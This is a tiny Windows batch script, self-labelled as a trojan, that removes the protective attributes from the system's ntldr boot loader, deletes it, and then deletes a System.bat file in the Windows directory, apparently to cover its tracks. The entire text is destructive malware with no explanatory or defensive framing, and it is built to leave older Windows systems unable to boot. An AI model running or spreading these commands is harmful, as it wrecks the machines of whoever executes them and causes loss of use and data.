echo off
:Troyan NTDIE!
cd %SystemDrive%\
attrib -s -h -r ../ntldr
erase %SystemDrive%\ntldr
erase %systemroot%\System.bat